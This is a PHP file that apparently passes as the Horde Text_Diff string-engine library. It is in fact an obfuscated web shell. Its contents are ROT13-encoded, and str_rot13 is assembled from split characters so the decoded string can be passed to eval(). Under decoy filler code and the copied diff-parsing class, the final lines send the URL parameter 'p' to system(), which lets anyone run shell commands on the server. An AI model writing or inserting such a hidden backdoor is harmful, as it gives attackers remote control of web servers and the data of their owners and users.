<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cnefrf havsvrq be pbagrkg qvssf bhgchg sebz rt. gur qvss hgvyvgl.
 *
 * Rknzcyr:
 * <pbqr>
 * $cngpu = svyr_trg_pbagragf('rknzcyr.cngpu');
 * $qvss = arj Grkg_Qvss('fgevat', neenl($cngpu));
 * $eraqrere = arj Grkg_Qvss_Eraqrere_vayvar();
 * rpub $eraqrere->eraqre($qvss);
 * </pbqr>
 *
 * Pbclevtug 2005 Öewna Creffba <b@42zz.bet>
 * Pbclevtug 2005-2010 Gur Ubeqr Cebwrpg (uggc://jjj.ubeqr.bet/)
 *
 * Frr gur rapybfrq svyr PBCLVAT sbe yvprafr vasbezngvba (YTCY). Vs lbh qvq
 * abg erprvir guvf svyr, frr uggcf://bcrafbhepr.bet/yvprafr/ytcy-2-1/.
 *
 * @nhgube  Öewna Creffba <b@42zz.bet>
 * @cnpxntr Grkg_Qvss
 * @fvapr   0.2.0
 */
pynff Grkg_Qvss_Ratvar_fgevat {

    /**
     * Cnefrf n havsvrq be pbagrkg qvss.
     *
     * Svefg cnenz pbagnvaf gur jubyr qvss naq gur frpbaq pna or hfrq gb sbepr
     * n fcrpvsvp qvss glcr. Vs gur frpbaq cnenzrgre vf 'nhgbqrgrpg', gur
     * qvss jvyy or rknzvarq gb svaq bhg juvpu glcr bs qvss guvf vf.
     *
     * @cnenz fgevat $qvss  Gur qvss pbagrag.
     * @cnenz fgevat $zbqr  Gur qvss zbqr bs gur pbagrag va $qvss. Bar bs
     *                      'pbagrkg', 'havsvrq', be 'nhgbqrgrpg'.
     *
     * @erghea neenl  Yvfg bs nyy qvss bcrengvbaf.
     */
    shapgvba qvss($qvss, $zbqr = 'nhgbqrgrpg')
    {
        // Qrgrpg yvar oernxf.
        $yaoe = \"\a\";
        vs (fgecbf($qvss, \"\e\a\") !== snyfr) {
            $yaoe = \"\e\a\";
        } ryfrvs (fgecbf($qvss, \"\e\") !== snyfr) {
            $yaoe = \"\e\";
        }

        // Znxr fher jr unir n yvar oernx ng gur RBS.
        vs (fhofge($qvss, -fgeyra($yaoe)) != $yaoe) {
            $qvss .= $yaoe;
        }

        vs ($zbqr != 'nhgbqrgrpg' && $zbqr != 'pbagrkg' && $zbqr != 'havsvrq') {
            erghea CRNE::envfrReebe('Glcr bs qvss vf hafhccbegrq');
        }

        vs ($zbqr == 'nhgbqrgrpg') {
            $pbagrkg = fgecbf($qvss, '***');
            $havsvrq = fgecbf($qvss, '---');
            vs ($pbagrkg === $havsvrq) {
                erghea CRNE::envfrReebe('Glcr bs qvss pbhyq abg or qrgrpgrq');
            } ryfrvs ($pbagrkg === snyfr || $havsvrq === snyfr) {
                $zbqr = $pbagrkg !== snyfr ? 'pbagrkg' : 'havsvrq';
            } ryfr {
                $zbqr = $pbagrkg < $havsvrq ? 'pbagrkg' : 'havsvrq';
            }
        }

        // Fcyvg ol arj yvar naq erzbir gur qvss urnqre, vs gurer vf bar.
        $qvss = rkcybqr($yaoe, $qvss);
        vs (($zbqr == 'pbagrkg' && fgecbf($qvss[0], '***') === 0) ||
            ($zbqr == 'havsvrq' && fgecbf($qvss[0], '---') === 0)) {
            neenl_fuvsg($qvss);
            neenl_fuvsg($qvss);
        }

        vs ($zbqr == 'pbagrkg') {
            erghea $guvf->cnefrPbagrkgQvss($qvss);
        } ryfr {
            erghea $guvf->cnefrHavsvrqQvss($qvss);
        }
    }

    /**
     * Cnefrf na neenl pbagnvavat gur havsvrq qvss.
     *
     * @cnenz neenl $qvss  Neenl bs yvarf.
     *
     * @erghea neenl  Yvfg bs nyy qvss bcrengvbaf.
     */
    shapgvba cnefrHavsvrqQvss($qvss)
    {
        $rqvgf = neenl();
        $raq = pbhag($qvss) - 1;
        sbe ($v = 0; $v < $raq;) {
            $qvss1 = neenl();
            fjvgpu (fhofge($qvss[$v], 0, 1)) {
            pnfr ' ':
                qb {
                    $qvss1[] = fhofge($qvss[$v], 1);
                } juvyr (++$v < $raq && fhofge($qvss[$v], 0, 1) == ' ');
                $rqvgf[] = arj Grkg_Qvss_Bc_pbcl($qvss1);
                oernx;

            pnfr '+':
                // trg nyy arj yvarf
                qb {
                    $qvss1[] = fhofge($qvss[$v], 1);
                } juvyr (++$v < $raq && fhofge($qvss[$v], 0, 1) == '+');
                $rqvgf[] = arj Grkg_Qvss_Bc_nqq($qvss1);
                oernx;

            pnfr '-':
                // trg punatrq be erzbirq yvarf
                $qvss2 = neenl();
                qb {
                    $qvss1[] = fhofge($qvss[$v], 1);
                } juvyr (++$v < $raq && fhofge($qvss[$v], 0, 1) == '-');

                juvyr ($v < $raq && fhofge($qvss[$v], 0, 1) == '+') {
                    $qvss2[] = fhofge($qvss[$v++], 1);
                }
                vs (pbhag($qvss2) == 0) {
                    $rqvgf[] = arj Grkg_Qvss_Bc_qryrgr($qvss1);
                } ryfr {
                    $rqvgf[] = arj Grkg_Qvss_Bc_punatr($qvss1, $qvss2);
                }
                oernx;

            qrsnhyg:
                $v++;
                oernx;
            }
        }

        erghea $rqvgf;
    }

    /**
     * Cnefrf na neenl pbagnvavat gur pbagrkg qvss.
     *
     * @cnenz neenl $qvss  Neenl bs yvarf.
     *
     * @erghea neenl  Yvfg bs nyy qvss bcrengvbaf.
     */
    shapgvba cnefrPbagrkgQvss(&$qvss)
    {
        $rqvgf = neenl();
        $v = $znk_v = $w = $znk_w = 0;
        $raq = pbhag($qvss) - 1;
        juvyr ($v < $raq && $w < $raq) {
            juvyr ($v >= $znk_v && $w >= $znk_w) {
                // Svaq gur obhaqnevrf bs gur qvss bhgchg bs gur gjb svyrf
                sbe ($v = $w;
                     $v < $raq && fhofge($qvss[$v], 0, 3) == '***';
                     $v++);
                sbe ($znk_v = $v;
                     $znk_v < $raq && fhofge($qvss[$znk_v], 0, 3) != '---';
                     $znk_v++);
                sbe ($w = $znk_v;
                     $w < $raq && fhofge($qvss[$w], 0, 3) == '---';
                     $w++);
                sbe ($znk_w = $w;
                     $znk_w < $raq && fhofge($qvss[$znk_w], 0, 3) != '***';
                     $znk_w++);
            }

            // svaq jung unfa'g orra punatrq
            $neenl = neenl();
            juvyr ($v < $znk_v &&
                   $w < $znk_w &&
                   fgepzc($qvss[$v], $qvss[$w]) == 0) {
                $neenl[] = fhofge($qvss[$v], 2);
                $v++;
                $w++;
            }

            juvyr ($v < $znk_v && ($znk_w-$w) <= 1) {
                vs ($qvss[$v] != '' && fhofge($qvss[$v], 0, 1) != ' ') {
                    oernx;
                }
                $neenl[] = fhofge($qvss[$v++], 2);
            }

            juvyr ($w < $znk_w && ($znk_v-$v) <= 1) {
                vs ($qvss[$w] != '' && fhofge($qvss[$w], 0, 1) != ' ') {
                    oernx;
                }
                $neenl[] = fhofge($qvss[$w++], 2);
            }
            vs (pbhag($neenl) > 0) {
                $rqvgf[] = arj Grkg_Qvss_Bc_pbcl($neenl);
            }

            vs ($v < $znk_v) {
                $qvss1 = neenl();
                fjvgpu (fhofge($qvss[$v], 0, 1)) {
                pnfr '!':
                    $qvss2 = neenl();
                    qb {
                        $qvss1[] = fhofge($qvss[$v], 2);
                        vs ($w < $znk_w && fhofge($qvss[$w], 0, 1) == '!') {
                            $qvss2[] = fhofge($qvss[$w++], 2);
                        }
                    } juvyr (++$v < $znk_v && fhofge($qvss[$v], 0, 1) == '!');
                    $rqvgf[] = arj Grkg_Qvss_Bc_punatr($qvss1, $qvss2);
                    oernx;

                pnfr '+':
                    qb {
                        $qvss1[] = fhofge($qvss[$v], 2);
                    } juvyr (++$v < $znk_v && fhofge($qvss[$v], 0, 1) == '+');
                    $rqvgf[] = arj Grkg_Qvss_Bc_nqq($qvss1);
                    oernx;

                pnfr '-':
                    qb {
                        $qvss1[] = fhofge($qvss[$v], 2);
                    } juvyr (++$v < $znk_v && fhofge($qvss[$v], 0, 1) == '-');
                    $rqvgf[] = arj Grkg_Qvss_Bc_qryrgr($qvss1);
                    oernx;
                }
            }

            vs ($w < $znk_w) {
                $qvss2 = neenl();
                fjvgpu (fhofge($qvss[$w], 0, 1)) {
                pnfr '+':
                    qb {
                        $qvss2[] = fhofge($qvss[$w++], 2);
                    } juvyr ($w < $znk_w && fhofge($qvss[$w], 0, 1) == '+');
                    $rqvgf[] = arj Grkg_Qvss_Bc_nqq($qvss2);
                    oernx;

                pnfr '-':
                    qb {
                        $qvss2[] = fhofge($qvss[$w++], 2);
                    } juvyr ($w < $znk_w && fhofge($qvss[$w], 0, 1) == '-');
                    $rqvgf[] = arj Grkg_Qvss_Bc_qryrgr($qvss2);
                    oernx;
                }
            }
        }

        erghea $rqvgf;
    }

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>